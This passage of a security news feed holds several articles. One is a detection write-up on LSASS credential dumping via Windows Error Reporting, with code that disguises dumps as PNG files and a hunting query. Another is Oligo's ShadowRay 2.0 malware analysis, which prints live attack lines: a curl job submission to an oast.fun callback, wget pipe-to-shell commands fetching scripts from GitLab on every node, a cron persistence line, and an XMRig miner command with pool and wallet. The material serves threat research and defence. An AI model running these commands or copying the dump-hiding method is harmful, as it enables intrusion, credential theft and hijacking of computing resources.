<< L" /type 268310";
std::wstring commandLine = cmd.str();
PPLProcessCreator creator;
These arguments are also captured under Sysmon Event ID 1.The WSASS tool uses the  API to write two minidump files under the names proc.png and proce.png. The proce.png is the encrypted dump and it is being deleted from the disk to reduce traces. The only artifact that remains is the non-encrypted dump. HANDLE hDump = CreateFileW(L"proc.png", GENERIC_WRITE, 0, &sa, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
HANDLE hEncDump = CreateFileW(L"proce.png", GENERIC_WRITE, 0, &sa, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
The MiniDump header is replaced by the PNG header on the .BYTE data[4] = { 0x89, 0x50, 0x4E, 0x47 }; 
It is possible to capture file type events and build queries by enabling the subsequent subcategories from the Object Access Audit Policies:Audit Handle ManipulationComputer Configuration > Windows Settings > Security Settings > Advanced Audit Policy Configuration > Audit Policies > Object AccessSimilarly to the  events, enabling these audit policies will generate a large volume of events. Organisations are advised to ensure that sufficient storage capacity exist in their SIEM infrastructure prior of any enablement. Generation of PNG images from arbitrary processes should be considered a non-legitimate activity. During the execution of the technique the  process is invoking the vulnerable version of the  binary. The interaction of a process attempting to access another object (i.e. process, file etc.) is captured under Windows Event ID 4663.Both the  and WSASS processes are interacting with the MiniDump file. The WSASS to pass the necessary arguments to the windows error reporting binary, to ensure the right privileges are set (PPL) and to modify the file headers of the minidump and the  that conducts the memory dump of the LSASS process. Sysmon Event ID 11 can capture file creation events and could be utilised as an additional data source. The file size of the PNG image is also a strong indicator of suspicious activity on the asset. The screenshot below demonstrates that the  has a file size above 83MB that is not considered standard. Running a threat hunting query to capture image files with significant size could assist towards identification of LSASS dump via the Windows Error Reporting. DeviceFileEvents
| where Timestamp > ago(30d)
| where tolower(FileName) endswith ".png"
| where FileSize >= 10485760  // 10 MB
| where ActionType in ("FileCreated", "FileRenamed")
| where not(FolderPath startswith "C:\\Program Files" or FolderPath startswith "C:\\Windows")
| project Timestamp, DeviceId, DeviceName, FolderPath, FileName, FileSize,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessParentFileName, InitiatingProcessAccountName,
          ActionType, SHA1
| sort by FileSize desc
The following table summarises the data sources and data components required to detect the technique. Handle Requests to ObjectsProcesses Accessing MiniDumpProcess Creation & Command LineModern Endpoint Detection and Response systems, especially with machine learning capability should be able to detect these activities and raise alerts. SOC teams should simulate the technique in their networks to identify visibility and detection gaps and enable additional data sources to aid threat hunting and detection engineering activities. ]]></content:encoded></item><item><title>Microsoft Teams to let users report messages wrongly flagged as threats</title><link>https://www.bleepingcomputer.com/news/microsoft/microsoft-teams-to-let-users-report-messages-wrongly-flagged-as-threats/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Tue, 18 Nov 2025 17:14:34 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Microsoft says that Teams users will be able to report false-positive threat alerts triggered by messages incorrectly flagged as malicious. [...]]]></content:encoded></item><item><title>Threat Actor &quot;888&quot; Claims LG Electronics Data Breach - Source Code and Hardcoded Credentials Allegedly Leaked [Unconfirmed]</title><link>https://cyberupdates365.com/lg-data-leak-claim-threat-a/</link><author>/u/bagguheroine</author><category>netsec</category><pubDate>Tue, 18 Nov 2025 17:12:46 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Threat actor “888” claims to have leaked sensitive LG Electronics data including source code repositories, SMTP credentials, and hardcoded authentication details, raising concerns about supply chain vulnerabilitiesThis article reports on an alleged data leak claim made by a threat actor. LG Electronics has not yet issued an official statement confirming or denying these claims. The information presented is based on public reports from cybersecurity monitoring platforms. This is NOT a confirmed security breach report. For official updates, visit LG Electronics Official Website and CISA Cybersecurity Advisories. a threat actor known as “888” has allegedly dumped sensitive data purportedly stolen from electronics giant LG Electronics, raising alarms in the cybersecurity community. The breach claim, first spotlighted on November 16, 2025, allegedly includes source code repositories, configuration files, SQL databases, and critically, hardcoded credentials and SMTP server details that could potentially expose LG’s internal communications and development pipelines to widespread exploitation.The leak surfaced via a post on ThreatMon, a platform that tracks dark web activity, where “888” shared samples to prove authenticity. Described as originating from a contractor access point, the dataset reportedly spans multiple LG systems, hinting at a supply chain vulnerability rather than a direct corporate hack. Cybersecurity analysts note that hardcoded credentials embedded directly in code for convenience pose severe risks, as they could enable attackers to impersonate LG personnel or pivot to connected services. SMTP credentials, which manage email routing, might further allow phishing campaigns or spam operations disguised as legitimate LG correspondence. Threat actor “888” is no stranger to high-profile claims, having been active since at least 2024 and targeting entities like Microsoft, BMW Hong Kong, Decathlon, and Shell, often extorting ransoms or selling data on breach forums. In this LG incident, no ransom demand has been publicly confirmed. Threat actor “888” allegedly dumped sensitive LG Electronics data on November 16, 2025 via ThreatMon dark web platform Source code repositories, configuration files, SQL databases, hardcoded credentials, and SMTP server details Described as originating from a contractor access point, suggesting supply chain vulnerability Leak surfaced via ThreatMon, a dark web activity tracking platform LG Electronics has not yet issued an official statement confirming or denying these claims LG Electronics and its internal systems, development pipelines, and communications infrastructure LG’s IoT devices, consumer electronics, and smart appliances if source code exposure is confirmed Contractor networks and third-party integrations potentially exposed through contractor access point LG Uplus (LG’s telecom arm) confirmed a separate breach affecting customer data in October 2025 Millions of LG device users worldwide potentially at risk if vulnerabilities are exposed Alleged leak claim; LG Electronics has not confirmed the breach as of November 17, 2025 Hardcoded credentials could enable attackers to impersonate LG personnel or pivot to connected services Email routing credentials might allow phishing campaigns disguised as legitimate LG correspondence Source code exposure could undermine LG’s proprietary technology in consumer electronics and smart appliances Security firms urging organizations to scan for leaked credentials using tools like Have I Been PwnedLATEST UPDATE & THREAT ACTOR CLAIMS threat actor “888” posted samples of allegedly stolen LG Electronics data on ThreatMon, a platform that tracks dark web activity. The threat actor claimed to have dumped sensitive data including source code repositories, configuration files, SQL databases, hardcoded credentials, and SMTP server details. The leak was described as originating from a contractor access point, suggesting a supply chain vulnerability rather than a direct corporate hack. LG Electronics has not yet issued an official statement confirming or denying these claims. The timing aligns with a turbulent year for the company, as LG’s telecom arm, LG Uplus, confirmed a separate breach affecting customer data in October 2025, amid a wave of South Korean telecom hacks. Experts speculate these incidents may share common vectors, such as unpatched vulnerabilities in cloud integrations or third-party tools. LG Electronics Official Website the samples shared include file structures suggesting the presence of gigabytes of proprietary code, which could undermine LG’s intellectual property in consumer electronics and smart appliances if confirmed. The exposure of source code could reveal flaws in LG’s IoT devices, amplifying risks for millions of users worldwide.ATTACK DETAILS & DATA EXPOSURE ANALYSISThe alleged data leak encompasses multiple critical components of LG Electronics’ infrastructure, each posing distinct security risks:Primary Data Types Allegedly Exposed:Source Code Repositories: Proprietary code for LG’s consumer electronics, smart appliances, and IoT devices – could reveal vulnerabilities and intellectual property System configurations that could expose network architecture and security settings Database structures and potentially sensitive data schemas Authentication details embedded directly in code – severe risk for impersonation and lateral movement Email routing credentials that could enable phishing campaigns disguised as legitimate LG correspondence1. Hardcoded Credentials RiskCybersecurity analysts note that hardcoded credentials embedded directly in code for convenience pose severe risks. These credentials could enable attackers to impersonate LG personnel, access internal systems, or pivot to connected services. Once exposed, hardcoded credentials are particularly dangerous because they cannot be easily rotated without code changes and redeployment.2. SMTP Credentials ExposureSMTP (Simple Mail Transfer Protocol) credentials manage email routing and could allow threat actors to launch sophisticated phishing campaigns or spam operations disguised as legitimate LG correspondence. This could be used to target LG’s customers, partners, or employees with convincing phishing emails.3. Source Code Intellectual PropertyThe alleged exposure of source code repositories represents a significant threat to LG’s intellectual property. Proprietary code for consumer electronics, smart appliances, and IoT devices could reveal vulnerabilities, design patterns, and competitive advantages. If confirmed, this exposure could have long-term implications for LG’s market position.4. Supply Chain Entry PointThe claim that the leak originated from a contractor access point highlights the fragility of global supply chains. A single contractor’s security lapse can cascade into corporate espionage, intellectual property theft, and widespread system compromise.THREAT ACTOR “888” PROFILE & PREVIOUS ACTIVITIESThreat actor “888” is no stranger to high-profile claims, having been active since at least 2024. This individual or group has targeted numerous high-profile entities, often extorting ransoms or selling data on breach forums.Threat actor “888” profile screenshot showing previous high-profile targets including Microsoft, BMW Hong Kong, Decathlon, and Shell. The threat actor has been active since at least 2024, often extorting ransoms or selling data on breach forums. Threat actor “888” has previously claimed attacks against Microsoft, demonstrating a pattern of targeting major technology companies The threat actor has been linked to claims involving BMW Hong Kong, showing a focus on automotive and technology sectors Previous claims involving Decathlon, a major sporting goods retailer, indicate a broad targeting approach Claims involving Shell, a major energy company, demonstrate targeting of critical infrastructure sectorsThreat actor “888” typically employs tactics involving initial access brokers and infostealer malware. The group monetizes leaks through cryptocurrency payments, often extorting ransoms or selling data on breach forums. In this LG incident, no ransom demand has been publicly confirmed, suggesting the data may be sold on underground markets or used for other purposes.The history of threat actor “888” includes numerous high-profile claims, but verification of actual breaches remains challenging. Some claims may be exaggerated or fabricated to gain notoriety or extort payments. Organizations should treat all such claims with caution until verified by official sources.LG ELECTRONICS CONTEXT & PREVIOUS SECURITY INCIDENTSThe alleged LG data leak claim comes at a time when the company has faced multiple security challenges. Understanding the broader context helps assess the credibility and potential impact of these claims.LG Uplus Breach (October 2025)Earlier in October 2025, LG’s telecom arm, LG Uplus, confirmed a separate breach affecting customer data. This incident occurred amid a wave of South Korean telecom hacks, raising concerns about systemic vulnerabilities in the country’s telecommunications infrastructure. LG Uplus Official WebsiteExperts speculate that the LG Uplus breach and the alleged LG Electronics leak may share common vectors, such as unpatched vulnerabilities in cloud integrations or third-party tools. This pattern suggests that supply chain security and third-party risk management are critical areas requiring attention.South Korean Telecom SectorThe wave of South Korean telecom hacks highlights broader cybersecurity challenges facing the country’s technology sector. South Korea is home to major technology companies and has been a frequent target of state-sponsored and financially motivated cyber attacks.LG Electronics operates globally, manufacturing consumer electronics, home appliances, and IoT devices used by millions of consumers worldwide. Any confirmed breach affecting LG’s source code or credentials could have far-reaching implications for product security and customer trust.EXPERT ANALYSIS & INDUSTRY IMPACT“The exposure of source code could reveal flaws in LG’s IoT devices, amplifying risks for millions of users worldwide. Hardcoded credentials pose severe risks as they could enable attackers to impersonate LG personnel or pivot to connected services.”The alleged breach claim underscores the fragility of global supply chains, where a single contractor’s lapse can cascade into corporate espionage. This incident highlights the critical importance of third-party risk management and supply chain security assessments.Intellectual Property ProtectionIf confirmed, the exposure of source code repositories represents a significant threat to intellectual property protection. Proprietary code contains trade secrets, design patterns, and competitive advantages that could be exploited by competitors or nation-state actors.Credential Management Best PracticesThe alleged exposure of hardcoded credentials serves as a reminder of the importance of proper credential management. Organizations should avoid hardcoding credentials in source code and instead use secure credential management systems, environment variables, or secrets management solutions.Incident Response ReadinessAs investigations unfold, security firms urge organizations to scan for leaked credentials using tools like Have I Been Pwned and to rotate all suspected keys immediately. This proactive approach can help mitigate the impact of credential exposure even before official confirmation.SUPPLY CHAIN SECURITY IMPLICATIONSThe claim that the alleged LG data leak originated from a contractor access point highlights critical supply chain security challenges facing modern organizations.Third-Party Risk ManagementOrganizations increasingly rely on contractors, vendors, and third-party service providers, creating an expanded attack surface. A single contractor’s security lapse can provide threat actors with a pathway into corporate networks, as allegedly occurred in this LG incident.Access Control and MonitoringThe alleged breach claim emphasizes the importance of strict access controls and continuous monitoring of third-party access. Organizations should implement least-privilege access principles, regularly audit contractor permissions, and monitor for anomalous activity.Supply Chain Security AssessmentsRegular security assessments of contractors and vendors are essential to identify and remediate vulnerabilities before they can be exploited. These assessments should include penetration testing, security questionnaires, and compliance verification.Incident Response CoordinationWhen breaches involve third parties, coordinated incident response becomes critical. Organizations should establish clear communication channels and response procedures with contractors to ensure rapid containment and remediation.FOR US BUSINESSES & ORGANIZATIONSIMMEDIATE ACTIONS (Next 24-48 Hours): Scan for leaked credentials using tools like Have I Been Pwned (haveibeenpwned.com) to identify if any organizational credentials have been exposed Rotate all suspected keys, passwords, and API tokens immediately, especially those that may have been hardcoded in applications or configuration files Review and audit all contractor and vendor access permissions, identifying any unnecessary or excessive privileges Review and secure SMTP server configurations, implement multi-factor authentication, and monitor for suspicious email activitySHORT-TERM ACTIONS (Next 30 Days): Conduct comprehensive code reviews to identify and remove any hardcoded credentials, replacing them with secure credential management solutions Perform security assessments of all contractors and vendors, verifying their security practices and compliance with your security requirements Implement least-privilege access principles, regularly audit permissions, and remove unnecessary access rights Deploy advanced monitoring solutions to detect anomalous activity, especially from contractor access pointsLONG-TERM STRATEGY (Ongoing): Implement enterprise-grade secrets management solutions (e.g., HashiCorp Vault, AWS Secrets Manager) to eliminate hardcoded credentialsSupply Chain Security Program: Establish a comprehensive third-party risk management program with regular assessments, security requirements, and incident response procedures Provide security awareness training to contractors and vendors, ensuring they understand and follow your security policiesIncident Response Planning: Develop and regularly test incident response plans that include procedures for third-party breaches and supply chain incidentsFOR INDIVIDUAL USERS & CONSUMERS Regularly monitor your accounts for suspicious activity, especially if you use LG devices or services Keep all LG devices and applications updated with the latest security patches and firmware updates Use strong, unique passwords for all accounts and enable multi-factor authentication wherever possible Be cautious of emails claiming to be from LG, especially those requesting personal information or credentialsReport Suspicious Activity: Report any suspicious activity or potential security incidents to LG customer support and relevant authoritiesFOR GOVERNMENT CONTRACTORS & CRITICAL INFRASTRUCTUREEnhanced Third-Party Requirements: Implement enhanced security requirements for contractors, including mandatory security assessments, background checks, and compliance verification Deploy 24/7 security operations center (SOC) monitoring for all contractor access points and third-party integrations Establish mandatory incident reporting procedures for third-party breaches, with specific timeframes and federal agency coordinationSupply Chain Security Standards: Adhere to federal supply chain security standards (e.g., NIST SP 800-161, CMMC) and ensure contractors meet these requirements Implement zero trust network architecture to minimize the impact of compromised contractor credentials hardcode credentials in source code or configuration files – use secure credential management solutions instead ignore third-party security assessments – contractors and vendors must meet your security standards delay credential rotation – rotate all suspected keys immediately, even before official breach confirmation assume contractor security – verify and continuously monitor third-party accessEMERGENCY RESOURCES & REPORTINGReport Cybersecurity Incidents:FBI Internet Crime Complaint Center (IC3):Emergency Hotline: 1-800-CALL-FBI (1-800-225-5324)For: Criminal cyber incidents, data breaches, credential theftEmail: central@cisa.dhs.gov24/7 Operations: 1-888-282-0870For: Infrastructure threats, supply chain incidents, vulnerabilitiesUS-CERT (Computer Emergency Readiness Team):For: Technical assistance, vulnerability reporting, incident coordinationFree Security Tools & Resources:RELATED ARTICLES ON CYBERUPDATES365KEY TAKEAWAYS & FINAL THOUGHTSThe alleged LG Electronics data leak claim represents a significant cybersecurity concern, highlighting the fragility of global supply chains and the critical importance of third-party risk management. While LG Electronics has not yet confirmed these claims, the incident underscores the need for organizations to implement robust security measures for contractors and vendors.Critical Points to Remember: pose severe security risks and should be eliminated through secure credential management solutions is critical – a single contractor’s lapse can cascade into widespread system compromise should proactively scan for leaked credentials and rotate suspected keys immediately, even before official breach confirmationAs security firms continue to investigate these claims and urge organizations to scan for leaked credentials, the cybersecurity community remains vigilant. Organizations must prioritize supply chain security assessments and credential management while individuals should monitor their accounts and update devices regularly.The cybersecurity landscape continues to evolve rapidly, with threat actors increasingly targeting supply chains and third-party access points. Staying informed and proactive is the best defense against emerging threats, whether confirmed or alleged.Stay Protected with CyberUpdates365Subscribe for real-time cybersecurity alerts, expert analysis, and actionable security guidance delivered directly to your inbox.Join 10,000+ cybersecurity professionals and business leaders staying ahead of emerging threats.Updated on November 17, 2025 by CyberUpdates365 Editorial TeamThis is a developing story. CyberUpdates365 is monitoring the situation and will provide updates as new information becomes available. Follow us on social media for real-time alerts.]]></content:encoded></item><item><title>French agency Pajemploi reports data breach affecting 1.2M people</title><link>https://www.bleepingcomputer.com/news/security/french-agency-pajemploi-reports-data-breach-affecting-12m-people/</link><author>Bill Toulas</author><category>security</category><pubDate>Tue, 18 Nov 2025 16:59:27 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Pajemploi, the French social security service for parents and home-based childcare providers, has suffered a data breach that may have exposed personal information of 1.2 million individuals. [...]]]></content:encoded></item><item><title>Meta Expands WhatsApp Security Research with New Proxy Tool and $4M in Bounties This Year</title><link>https://thehackernews.com/2025/11/meta-expands-whatsapp-security-research.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgkgOl-JrSVLAI7Qi4qHDyFCjyRB3ue79utMC8yXawZU8fE17CUF-DjowrvhQV0Ke-fV3jK8YJE1H42F1c7hY_zDDIUII9ebtwbV0tqUCWMexiiQFugTyUbFh1Q9CalI5fgUUYQt6SApcAqvJ_uqWC7ZX31-XwGkrEmFOIDXfzNRGVMkPj0dklvQA1Mi1V6/s1600/whatsapp-proxy.jpg" length="" type=""/><pubDate>Tue, 18 Nov 2025 15:56:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Meta on Tuesday said it has made available a tool called WhatsApp Research Proxy to some of its long-time bug bounty researchers to help improve the program and more effectively research the messaging platform's network protocol.
The idea is to make it easier to delve into WhatsApp-specific technologies as the application continues to be a lucrative attack surface for state-sponsored actors and]]></content:encoded></item><item><title>ShadowRay 2.0: Active Global Campaign Hijacks Ray AI Infrastructure Into Self-Propagating Botnet | Oligo Security</title><link>https://www.oligo.security/blog/shadowray-2-0-attackers-turn-ai-against-itself-in-global-campaign-that-hijacks-ai-into-self-propagating-botnet</link><author>/u/cov_id19</author><category>netsec</category><pubDate>Tue, 18 Nov 2025 15:28:24 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Oligo Security researchers have uncovered an ACTIVE global hacking campaign that uses AI to attack AI. The operation, dubbed ShadowRay 2.0, exploits a known, yet disputed, flaw in Ray, an open-source framework that powers many of today’s AI systems, to quietly seize control of powerful computing clusters and conscript them into a self-replicating botnet.In early November 2025, the Oligo Security research team identified an attack campaign exploiting the ShadowRay vulnerability (CVE-2023-48022) in Ray, a widely used open-source AI framework. This is the same flaw Oligo previously observed being exploited in late 2023 (see the new MITRE, ShadowRay, Campaign C0045). For the recent campaign, attackers leveraged DevOps-style infrastructure by using GitLab as a platform for updating and delivering region-aware malware. Oligo reported this activity to Gitlab and the attacker repository and account was removed on November 5, 2025. However, Oligo has determined that the attackers have migrated to GitHub in order to continue their campaign as of November 10, 2025, creating multiple accounts and new repos. It remains active. The latest campaign represents a major evolution from our initial ShadowRay discovery. The attackers, operating under the name , have turned Ray’s legitimate orchestration features into tools for a self-propagating, globally cryptojacking operation, spreading autonomously across exposed Ray clusters.What makes this campaign particularly notable is the : our analysis shows attackers leveraged LLM-generated payloads to accelerate and adapt their methods. We also observed multiple criminal groups competing for the same CPU resources, often terminating legitimate workloads and rival cryptominers to maximize profits.Equally concerning is the campaign’s operational sophistication. The attackers limited CPU usage to ~60% to evade detection, disguised malicious processes as legitimate services, and hid GPU usage from Ray’s monitoring to avoid detection while leveraging premium compute resources. In addition, the attackers employed a DevOps-style infrastructure by using GitLab for real-time,  updates and delivery. Evidence suggests the operation could have been active since September 2024, compromising Ray clusters across multiple continents through automated OAST-based discovery.This isn’t just another cryptojacking campaign. It’s the foundation of a  capable of DDoS attacks, data exfiltration, and global autonomous propagation.What is also highly concerning is that this vulnerability is “disputed” because the maintainers indicate that Ray is not intended for use outside a “strictly-controlled network environment”. In practice however, users often deploy Ray without heeding this warning, which creates an extended window for exploitation, evidenced by its continued and expanded weaponization by attackers in the wild. In fact, there are now more than 230,000 Ray servers exposed to the internet, in contrast to the few thousand we observed during our initial ShadowRay discovery.The ShadowRay campaign from March 2024The growth of exposed Ray servers The new waves of attacks leveraging CVE-2023-48022The attack group’s techniquesHow the attackers have evaded detectionRecommendations for protectionWhy we looked into Ray (again)Our renewed research into Ray began when we were looking into some customer environments and noticed that they were running Ray. While those instances were already protected through Oligo’s runtime security platform, the potential risk was flagged to ensure proper configuration and secure deployment of Ray, meaning no Oligo customer environments were impacted or targeted in this new attack campaign.A History Lesson: The Original ShadowRay CampaignIn March 2024, Oligo unveiled ShadowRay, a vulnerability that was leveraged in the first known attack campaign exploiting AI workloads in the wild. The attackers exploited CVE-2023-48022 that impacts Ray, the open-source AI framework commonly referred to as the “Kubernetes of AI.” The flaw allows unauthenticated remote code execution (RCE) through Ray’s Jobs API. Our original research showed that thousands of exposed Ray servers had already been compromised across a variety of sectors. Attackers used them to run cryptominers, steal secrets, and exfiltrate data from live AI workloads. While certain related issues were patched, CVE-2023-48022 itself was never directly fixed. The behavior in Ray is a design feature and is safe when used in a trusted environment that is not exposed to the internet. Following the disclosure, Ray maintainers issued configuration and deployment guidance, advising that “Security and isolation must be enforced outside of the Ray Cluster.”.DISCLAIMER: The new campaign does not relate to Anyscale’s (the developers of Ray) SaaS offerings or paid products. The sole intention of this blog is to support users of Ray by increasing awareness of its security aspects and common pitfalls.This means that while the CVE can be detected in environments, there is not a specific version to upgrade to. Users are urged to follow the official Ray security guidelines and also leverage this open-source tool to verify proper configuration of their clusters to avoid accidental exposure.The Growth of Exposed Ray ServersSince early November 2025, our research team has identified significant renewed malicious activity in exposed Ray clusters around the world, nearly two years after us originally showing CVE-2023-48022 being exploited in the wild.At the time of our original research, only thousands of exposed Ray servers were observed in the wild. Our scans today reveal that over 200,000 Ray servers remain exposed to the internet, with a portion confirmed as vulnerable or already compromised. Many of the exposed servers belong to active startups, research labs, and cloud-hosted AI environments, while some are honeypots. The lack of a definitive patch, coupled with the assumption that users would self-secure their clusters, has allowed threat actors to weaponize the same underlying weakness, culminating in the new ShadowRay v2 campaign.New Threat Actors, New AttacksThe campaign we have observed mirrors some of the characteristics and behaviors consistent with ShadowRay’s original exploitation chain:RCE via the exposed Ray dashboard API.Payload injection to deploy cryptocurrency miners and data exfiltration tools.Persistence mechanisms disguised as Ray worker processes.New IoCs observed in compromised nodes (full list below).  While this new activity shares some common threads with our March 2024 research, it is being carried out by entirely new threat actors that are leveraging different techniques to reach their end goals.Two Waves of Attacks UncoveredOur analysis of the ShadowRay 2.0 activity shows that the campaign did not end with a single takedown. Instead, it evolved across two platforms:Wave One – GitLab launched: In early November 2025, attackers were using GitLab for their payload evolution and delivery. After Oligo reported the activity to GitLab, the attackers’ account and repository was removed on November 5, 2025.Wave Two – GitHub launched: Within days of the GitLab takedown, the threat actors reestablished their operation by standing up a new GitHub repository to continue the advanced attacks via a repository that went live on November 10, 2025. On November 17, the repo was taken down, with attackers immediately creating a new one on the same day. The second wave remains active, demonstrating the attackers’ persistence and agility in maintaining the campaign. Below, we walk through the technical details, findings, and evidence of the techniques the attackers have deployed in both phases of this ongoing campaign. GitLab-Launched Attack Campaign: Technical Breakdown and Evidence of TechniquesBelow, we walk through the specific techniques the attackers used in this campaign with GitLab as their delivery mechanism, providing evidence of what was uncovered and how they used their methods to evolve from simple cryptojacking efforts to building a multi-purpose botnet.1: Discovery - "Finding the Needle in the Internet Haystack"Attackers used interact.sh (an OAST platform) to spray payloads across the internet and identify which Ray dashboard IPs were exploitable. By sending callbacks to oast.fun subdomain, they could track which servers executed their commands.Attackers have triggered the very first step in Ray by posting a job that :http://[host]:[port]/api/jobs/" -H 'Content-Type: application/json' -d '{"entrypoint": "curl bwqqvqfgsseplyoltois92rdukv0mm5th.oast.fun"}'This is reconnaissance as a service - attackers weaponized out-of-band platforms to automatically discover vulnerable targets at scale. Instead of manual scanning, they let victims identify themselves by calling back. This approach also helps evade traditional scanning detection.2: Initial Access - "Exploiting Ray's Trust"Attackers exploited completely unauthenticated Ray Job Submission APIs (/api/jobs/) on exposed dashboards. They submitted malicious jobs with commands ranging from simple reconnaissance (uname -a, id) to complex multi-stage Bash and Python payloads.Ray's dashboard was designed for trusted internal networks but is frequently exposed to the internet without authentication. The attackers didn't need to exploit a vulnerability, they just used Ray's features as designed. This is a configuration vulnerability at scale.The obfuscated “stage 2” of the payload includes the docstrings and useless echoes, which strongly implies the code is LLM-generated:The payloads were base64-encoded. After decoding, we can see the LLM-generated payloads still include their documentation - like we saw with the rest of the payloads. Stage 2 is around resource discovery, and uses only 1 CPU. 3: Lateral Movement - "Weaponizing Ray's Orchestration"Attackers deployed a payload that used Ray's NodeAffinitySchedulingStrategy to execute malware on every alive node in the cluster. The payload literally enumerated all nodes and submitted jobs pinned to each specific node ID.This is lateral movement via legitimate orchestration features in Ray. Instead of exploiting CVEs or using network attacks, attackers used Ray's own scheduling API to spread. It's essentially using the victim's infrastructure as intended, using python code - like the applications that are already running,  just for malicious purposes:nodes=[n for n in ray.nodes() if n.get('Alive',False)]cmd='wget -qO- https://gitlab.com/ironern440-group/ironern440-project/-/raw/main/aa.sh | tr -d "\\r" > aa_clean.sh && chmod +x aa_clean.sh && ./aa_clean.sh'[ray.get(ray.remote(lambda: subprocess.run(cmd,shell=True)).options(scheduling_strategy=NodeAffinitySchedulingStrategy(node_id=n.get('NodeID')...4: AI-Generated Reconnaissance - "Using AI to Attack AI"Attackers deployed a sophisticated multi-stage Python payload that discovers cluster resources (CPUs, GPUs), calculates optimal allocation (60%), and then submits a takeover job with those exact resource requirements.The payloads from gitlab are likely to be AI-generated, based on its structure, comments, and error handling patterns. Attackers are now using AI to generate attack code targeting AI infrastructure. The 60% resource allocation is particularly clever, as it leaves enough resources running to avoid immediate detection while maximizing mining profits.Automatic CPU/GPU discovery via ray.cluster_resources()Dynamic resource calculation: usable_cpus = max(1, int(total_cpus * 0.6))Multi-stage execution with error handling5: Reverse Shells - "Opening the Backdoor"Attackers established multiple interactive reverse shells to AWS-hosted C2 servers, giving them command-line access to compromised Ray clusters. Multiple shells to different ports suggest redundancy or different attack operators.The use of multiple simultaneous reverse shells on different ports indicates either multiple attackers competing for access or sophisticated failover mechanisms. Evidence shows shells connecting to ports 3876, 40331, 48331, and 443 - suggesting extensive C2 infrastructure.6: Persistence - "Ensuring They Never Leave"Attackers installed multiple persistence mechanisms: cron jobs running every 15 minutes, systemd services disguised as system components, and .bashrc injections. The cron job continuously re-downloads and executes mon.sh from GitLab.The use of GitLab as a live C2 infrastructure means attackers can update payloads in real-time. Every 15 minutes, all compromised systems check for updates and re-infect themselves. This turns GitLab into a distributed update mechanism for malware.*/15 * * * * wget -O - https://gitlab.com/ironern440-group/ironern440-project/-/raw/main/mon.sh | bash7: Masquerading - "Hiding in Plain Sight"Attackers renamed malicious processes to look like legitimate Linux kernel workers (kworker/0:0) and system services (dns-filter). The XMRig cryptocurrency miner was renamed to .python3.6 and disguised as a systemd service.The sophistication of process renaming goes beyond simple hiding. By using echo "kworker/0:0" > /proc/$$/comm, they change how the process appears in system monitoring tools. The name "dns-filter" suggests DNS filtering, which IT teams might expect to see running.Process rename to [kworker/0:0] (appears as kernel worker)Binary named /usr/lib/dev/systemdev/dns-filter (looks like system service)Hidden binary .python3.6 in current directorySystemd service names: custom-X-service8: GPU Mining - "Stealing Premium Compute"Attackers specifically targeted Ray clusters with NVIDIA GPUs (A100s in particular). Environment variables show NVIDIA libraries loaded and 23.9GB of GPU memory consumed, but Ray's dashboard reports 0% GPU utilization, indicating a hidden miner.GPU cryptojacking is a goldmine, because A100 GPUs cost $3-4/hour on cloud platforms. By hiding GPU usage from Ray's monitoring, attackers avoid immediate detection while stealing premium compute resources. The resource discovery payload specifically checks for GPU availability before deploying GPU-enabled miners.9: Competition Elimination - "Cryptojacker vs. Cryptojacker"Attackers deployed sophisticated scripts to detect and kill rival cryptocurrency miners. They hunt for processes matching patterns like "xmrig", "minerd", "ccminer", or any process using >25% CPU. They also block competing mining pools via /etc/hosts and firewall rules.This reveals a hidden war between cryptojacking groups. Multiple attackers are targeting the same Ray clusters, and they're actively fighting each other for resources. The scripts specifically protect their own miner (connected to supportxmr.com) while killing everything else. It's organized crime with source code.if echo "$cmdline" | grep -vq "supportxmr.com" && echo "$cmdline" | grep -q "xmrig"; thenMultiple other Monero pools via /etc/hosts and iptablesKicking out competitors - Manipulation of iptables to block other attackers and threat actors from reaching the vulnerable instance again after killing their processes.The same file as above, on GitLab - at a later point in time. Their “NEW POOL & WALLET” according to the docstrings - the attackers have been doing it with different addresses for along time.10: Geographic Targeting - "Adapting to the Victim"Attackers implemented geolocation detection to identify if the victim is in China. Chinese victims receive payloads from run-CN.sh (using China-accessible CDNs), while others get run.sh. This suggests infrastructure optimization and censorship bypass.This is region-aware malware. By detecting the victim's country, attackers can adapt delivery methods, potentially use regional proxies (GitHub proxy and Chinese IP geolocation services), and optimize for network conditions. It suggests a mature operation targeting global infrastructure world-wide.if curl -s --connect-timeout 3 -4 http://ip-api.com/json/ | grep -q '"country":"China"'; then    download_url="https://gitlab.com/ironern440-group/ironern440-project/-/raw/main/run-CN.sh"Proxied download via gh-proxy.com - so the payload will succeed in Chinese servers that have censored DNS support - or to bypass security rules that prevent requests to github.com directly.Some payloads tried using either wget or curl - usually one of them was present on the machine and fetched the initial payload from GitLab, and later, the miner through GitHub.11: Cryptocurrency Mining - "The Payoff"Attackers deployed XMRig miners connecting to pool.supportxmr.com:443 using TLS encryption. Multiple compromised clusters show 99% CPU usage and significant GPU utilization.The use of TLS on port 443 makes mining traffic look like legitimate HTTPS traffic, blending into normal network activity. The mining pool tracks show regular payouts, confirming this is an active, profitable operation.Example Mining Configuration (there were many):/usr/lib/dev/systemdev/dns-filter -o pool.supportxmr.com:443 -u 45MinZ6ECgTgxn8gbm5gAsK9ATrEN6N95hbH3g4r5N4bKwH8QxuFygw3G7VwHwAusR9L35E4YjWYdTJaWDjbMGDCKYNz5X1.v2 --tlsThe files when accessed on Nov. 2The files when accessed on Nov. 4 Attacker payload changes were visible through GitLab diffs:The attackers changed their “exclude pattern” - their own miner fingerprint - that is used to distinguish other miners that were a result of another attack group.The difference was visible through GitLab easily - Here is a commit that removes all comments (probably using an LLM too).Some payloads were hosted on GitHub. This repo is used for hosting malware as GitHub version releases.Attackers have downloaded cryptominer 